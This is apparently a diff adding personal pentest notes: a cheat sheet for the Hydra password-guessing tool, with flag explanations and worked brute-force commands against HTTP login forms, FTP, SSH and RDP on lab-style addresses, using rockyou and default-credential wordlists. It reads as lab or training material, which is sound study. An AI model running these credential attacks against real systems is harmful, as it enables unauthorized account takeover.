@@ -1,1 +1,81 @@
+Syntax
+hydra [OPTIONS] IP
+Useful flags
+
+    -h: see the help menu
+    -l <LOGIN>: Pass single username/login
+    -L <FILE>: Pass multiple usernames/logins
+    -p <LOGIN>: Pass single known password
+    -P <FILE>: Pass a password list or wordlist (ex.: rockyou.txt)
+    -s <PORT>: Use custom port
+    -f: Exit as soon as at least one a login and a password combination is found
+    -R: Restore previous session (if crashed/aborted)
+
+Options:
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
+  -U        service module usage details
+  -m OPT    options specific for a module, see -U output for information
+  -h        more command line options (COMPLETE HELP)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
+  -V for verbosity
+  
+HTTP-Post  
+sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
+After filling in the placeholders, here’s our actual command!
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
+
+The HTTP POST body sends two values in the login form to /service/rapture/sesssion — a username and a password, both base64 encoded.  
+Check headers filename to see where the http post body is sending the two values
+
+A valid hydra command would look like this:
+# -I : ignore any restore files
+# -f : stop when a login is found
+# -L : username list
+# -P : password list
+# ^USER64^ and ^PASS64^ tells hydra to base64-encode the values <-- Base64 Encode
+# C=/ tells hydra to establish session cookies at this URL
+# F=403 tells hydra that HTTP 403 means invalid login
+
+hydra -I -f -L usernames.txt -P passwords.txt 'http-post-form://192.168.207.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
+hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.207.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
+
+Hydra Post on a forum
+hydra -l mute -P /usr/share/wordlists/rockyou.txt internal.site.local http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=login:Invalid Username or Password"
+
+FTP
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt x.x.x.x ftp
+hydra -e nsr -C /usr/share/seclists/Passwords/Default-Credentials 10.11.x.x ftp
+hydra -e nsr -L username <IP address> ftp 
+
+The -e switch has three options, n, s, and r:
+    n: This option checks for a null password
+    s: This option is used for login name as password
+    r: This is the reverse of login name as password
+    - L: specify a list of usernames
+    - P: specify a list of passwords
+    -C: Colon separated file for username/password colon-seperated formatted files.
+    
+For FTP attack use this command
+    #hydra -l userlogin -P password-list-adress ftp://----IP--Address -V
+    
+FTP 
+$ hydra -l admin -C /usr/share/seclists/Passwords/Default-Credentials 192.168.106.110 ftp ← Good default cred list. 
+
+
+SSH
+$ hydra -L users -P pass ssh://192.168.136.125 -t 4 -s 43022
+
+RDP
+hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://192.168.1.1
+
+
+
+
+
 
